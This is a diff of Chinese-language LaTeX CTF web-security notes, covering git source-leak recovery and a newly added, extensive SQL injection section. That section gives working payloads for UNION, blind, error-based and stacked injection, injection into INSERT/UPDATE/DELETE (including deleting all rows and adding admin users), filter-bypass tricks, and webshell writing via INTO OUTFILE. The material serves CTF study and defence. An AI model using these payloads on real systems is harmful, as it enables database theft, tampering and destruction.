@@ -13,21 +13,21 @@ web类题目是CTF比赛的主要题目，和二进制、逆向题目相比，�
 \paragraph*{常规git泄露}
 直接用现成工具或脚本获取网站源码或flag。如：在确保目标URL含有.git的情况下，可以直接使用\href{https://github.com/denny0223/scrabble}{scrabble}来获取网站源码。命令如下：
 \begin{lstlisting}
-    ./scrabble http://example.com/
+./scrabble http://example.com/
 \end{lstlisting}
 
 \paragraph*{git回滚}
 利用scrabble获取网站源码后，部分情况下，flag会在之前的commit中被删除/修改，这时需要回滚。
 \begin{lstlisting}
-    git reset --hard HEAD^ #回滚到上一版本
-    git log -stat #查看每个commit修改了什么
-    git diff HEAD commit-id #查看当前版本与目标版本的区别
+git reset --hard HEAD^ #回滚到上一版本
+git log -stat #查看每个commit修改了什么
+git diff HEAD commit-id #查看当前版本与目标版本的区别
 \end{lstlisting}
 
 \paragraph*{git分支}
 有时候flag不在默认分支中，需要切换其他分支，但大部分现成git泄露工具不支持分支，还原其他分支代码需要手工进行文件提取。功能较强的工具有\href{https://github.com/WangYihang/GitHacker}{GitHacker}，用法：
 \begin{lstlisting}
-    python GitHacker.py [Website]
+python GitHacker.py [Website]
 \end{lstlisting}
 而后使用$git\ reflog$命令查看checkout记录，可以发现其他分支，然后修改/复用GitHacker代码来自动恢复分支。
 
@@ -81,4 +81,235 @@ Wappalyzer工具：python工具，使用pip安装即可。
 
 
 \section{SQL注入}
+\subsection{SQL注入基础}
+介绍数字型注入、UNION注入、字符型注入、布尔型注入、时间注入、报错注入和堆叠注入。
+
+\subsubsection*{数字型注入和UNION注入}
+数字型注入：注入点为数字。
+\begin{itemize}
+    \item 判断方法：注入$3-1$之类的计算式来判断是否是数字型注入。
+    \item 利用方法：结合UNION语句进行联合查询注入。
+\end{itemize}
+联合查询时需要知道表名，mysql有自带数据库$information\_schema$，里面包含了所有的数据库名、表名、字段名：
+\begin{lstlisting}
+UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()
+UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name='NAME'
+\end{lstlisting}
+$ group\_concat $是将多行查询结果以逗号分隔放在一行的函数。
+
+注意：UNION查询时，后面查询的列数要和前面查询语句查询的列数一样，所以需要用'UNION SELECT 1,2,3,...,n'的方法首先确定列数。
+
+\subsubsection*{字符型注入和布尔盲注}
+字符型注入：数字注入点外部包裹了引号。
+\begin{itemize}
+    \item 判断方法：输入字符'a'，看查询结果和0是否一致。因为a会被强制转换为0。
+    \item 利用方法：用引号闭合前面的语句，最后面用'\#'或者'-- '注释后面的部分。
+    \item 注意用URL编码，'\#'为'\%23'，' '为'\%20'，单引号为'\%27'，双引号为'\%22'。
+\end{itemize}
+之后操作和数字型一致。
+
+布尔盲注：看不到查询结果时，通过在查询语句中添加判断式、观察回显页面来推测数据。
+\begin{itemize}
+    \item 判断方法：存在字符型注入或字符型注入但又看不到查询结果，只能通过回显页面判断结果是否存在。
+    \item 利用方法：后面添加判断式，逐字符猜测结果。
+    \item 常用函数：substring(str,start,len)，mid(str,start,len),substr(str,start,len)。
+\end{itemize}
+例子：
+\begin{lstlisting}
+SELECT title,content FROM wp_news WHERE id='1' AND (SELECT MID((SELECT concat(user,0x7e,pwd) FROM wp_user),1,1)) = 'a'
+\end{lstlisting}
+'0x7e'是波浪号。
+
+时间盲注：查询成功和查询失败的回显页面没有任何区别，这时可以通过IF或OR、AND语句，加入sleep函数，通过观察执行时间来判断。
+
+\subsubsection*{报错注入}
+报错注入：目标网站开启了错误调试信息，报错信息会回显到网页上。如：
+\begin{lstlisting}
+SELECT ... FROM ... WHERE ... OR VAR_DUMP(mysqli_error($\$$conn))
+\end{lstlisting}
+\begin{itemize}
+    \item 判断方法：输入语法错误语句，看是否有报错语句回显。
+    \item 利用方法：利用updatexml()第二个参数的特性，其第二个参数不是合法的XPATH路径时，会输出传入的参数。
+\end{itemize}
+例子：
+\begin{lstlisting}
+SELECT title,content FROM wp_news WHERE id='1' OR updatexml(1,concat(0x7e,(select pwd from wp_user)),1)
+\end{lstlisting}
+
+堆叠注入：目标开启了多语句执行，可以一次注入多行命令，任意修改表和数据库。
+
+\subsection{注入点}
+从SQL语法角度讲注入技巧。
+
+\subsubsection*{SELECT注入}
+\paragraph*{注入点在select\_expr}
+源码形式: 
+\begin{lstlisting}
+SELECT $\$${_GET['id']}, content FROM wp_news
+\end{lstlisting}
+且页面只会显示结果中的'title','content'列。
+注入方法：时间盲注或AS别名。
+\begin{lstlisting}
+别名: id = (SELECT pwd FROM wp_user) AS title
+\end{lstlisting}
+
+\paragraph*{注入点在table\_reference}
+源码形式: 
+\begin{lstlisting}
+SELECT title FROM $\$${_GET['table']}
+\end{lstlisting}
+且页面只会显示结果中的'title','content'列。
+注入方法：AS别名。
+\begin{lstlisting}
+别名: table = (SELECT pwd AS title FROM wp_user)
+\end{lstlisting}
+
+\paragraph*{注入点在WHERE或HAVING后}
+源码形式：
+\begin{lstlisting}
+SELECT title FROM wp_news WHERE id=$\$${_GET['id']}
+\end{lstlisting}
+最常见的，和上一节的方法一样，注意判断和闭合引号和括号。
+
+\paragraph*{注入点在GROUP\ BY或ORDER\ BY后}
+源码形式：
+\begin{lstlisting}
+SELECT title FROM wp_news GROUP BY $\$${_GET['title']}
+\end{lstlisting}
+判断和注入：判断下列语句是否有效，而后时间盲注。
+\begin{lstlisting}
+title = id desc,(if(1,sleep(1),1))
+\end{lstlisting}
+
+\paragraph*{注入点在LIMIT后}
+LIMIT后只能是数字，在语句没有ORDER\ BY关键字时，可以用UNION注入。MYSQL5.6前的版本可以用PROCEDURE注入,这个语句可以获取版本号：
+\begin{lstlisting}
+SELECT id FROM wp_news LIMIT 2 PROCEDURE analyse(extractvalue(1,concat(0x3a,version())),1)
+\end{lstlisting}
+'0x3a'是':'，处理时会报错，错误回显会显示version()。
+没有错误回显时，也可以基于时间注入获取版本号：
+\begin{lstlisting}
+PROCEDURE analyse((SELECT extractvalue(1,concat(0x3a,(IF(MID(VERSION(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1))))))),1)
+# BENCHMARK处理时间大概为1s。
+\end{lstlisting}
+确定版本在5.6之前后，可以用INTO\ OUTFILE语句直接向web目录写入webshell。
+没有写文件权限时，可以用如下语句控制部分内容:
+\begin{lstlisting}
+SELECT xxxx INTO outfile "/tmp/xxx.php" LINES TERMINATED BY '<?php phpinfo;?>'
+\end{lstlisting}
+
+\subsubsection*{INSERT注入}
+\paragraph*{注入点位于tbl\_name}
+源码形式:
+\begin{lstlisting}
+INSERT INTO $\$${_GET['table']} VALUES(2,2,2,2)
+\end{lstlisting}
+注入方法：可以注释后面语句的情况下，可以直接向任意表格插入数据。
+\begin{lstlisting}
+table=wp_user values(2,'new_admin','new_password')#
+\end{lstlisting}
+
+\paragraph*{注入点位于VALUES}
+源码形式:
+\begin{lstlisting}
+INSERT INTO wp_user VALUES(1,1,'$\$${_GET['value']}')
+\end{lstlisting}
+注入方法：闭合单引号后另行插入一个values。
+\begin{lstlisting}
+value=1',values(2,1,'aaa')
+value=1',values(2,1,(SELECT pwd FROM wp_user LIMIT 1)) #能回显部分字段情况下直接查询
+\end{lstlisting}
+
+\subsubsection*{UPDATE注入}
+源码形式：
+\begin{lstlisting}
+UPDATE wp_user SET id=$\$${_GET['id']} WHERE user='x'
+\end{lstlisting}
+注入方法：可以修改多字段，或使用与SELECT语句类似的方法。
+\begin{lstlisting}
+id=1,user='y'
+\end{lstlisting}
+
+\subsubsection*{DELETE注入}
+源码形式：
+\begin{lstlisting}
+DELETE FROM wp_news WHERE id=$\$${_GET['id']}
+\end{lstlisting}
+注入方法：可以直接删除整个表，也可以通过sleep防止表被删后进行时间盲注:
+\begin{lstlisting}
+id=1 or 1   #删除所有
+id=1 and sleep(1)   #sleep会返回0
+\end{lstlisting}
+
+
+\subsection{注入和防御}
+
+\subsubsection*{字符替换}
+防御方法：直接替换关键字。
+
+\paragraph*{只替换空格}
+防御者直接替换空格为空。
+攻击方法：用"\%0a,\%0b,\%0c,\%09,\%a0"和/**/组合、括号等替代空格。
+
+\paragraph*{将SELECT替换为空}
+防御者直接替换SELECT为空。
+攻击方法：嵌套，使用SESELECTLECT。
+
+\paragraph*{大小写匹配}
+防御者替换select或SELECT。
+攻击方法：使用sElEcT。
+
+\paragraph*{正则匹配}
+匹配语句:"$\backslash$bselect$\backslash$b"。
+攻击方法：可以用"/*!5000select*/"绕过。
+
+\paragraph*{过滤引号，但没过滤反斜杠}
+源码形式：
+\begin{lstlisting}
+SELECT * FROM wp_news WHERE id='可控点1' AND title='可控点2'
+\end{lstlisting}
+攻击方法：使用反斜杠转义可控点1后面的单引号，使可控点2逃逸。
+\begin{lstlisting}
+可控点1：a\
+可控点2：or sleep(1) #
+\end{lstlisting}
+
+\subsubsection*{逃逸引号}
+开发者常常对用户输入做addslashes，添加反斜杠转义引号等。
+
+\paragraph*{编码解码}
+若开发者使用了urldecode、base64\_decode等解码函数，则将引号编码后输入。
+
+\paragraph*{意料之外的输入点}
+PHP中上传的文件名、http\ header、$\$$\_SERVER['PHP\_SELF']。
+
+\paragraph*{二次注入}
+开发者通常信任数据库中取出的数据。
+攻击者可以设置用户名为admin'or'1，用户名在转义后可以顺利存入数据库。当用户名被再次使用时：
+\begin{lstlisting}
+SELECT password from wp_user WHERE username='admin'or'1'
+\end{lstlisting}
+
+\paragraph*{字符串阶段}
+开发者可能限定长度。
+源码形式：
+\begin{lstlisting}
+SELECT * FROM wp_news WHERE id='可控点1' AND title='可控点2'
+\end{lstlisting}
+其中限制了可控点1的长度为10且添加了addslashes转义可控点1中的反斜杠、引号。
+攻击方法：
+\begin{lstlisting}
+可控点1=aaaaaaaaa'
+\end{lstlisting}
+这时可控点1会被转义为aaaaaaaaa$\backslash$',正好'被截断，最后一位是$\backslash$，从而使可控点2逃逸。
+
+\subsection{注入的功效}
+\begin{itemize}
+    \item 文件读写。INTO\ OUTFILE、DUMPFILE、load\_file()。
+    \item 提权。添加权限、添加用户。
+    \item 文件读取。
+    \item 数据库控制。
+    \item SQL\ SERVER中系统命令执行。
+\end{itemize}
+
 \section{任意文件读取}
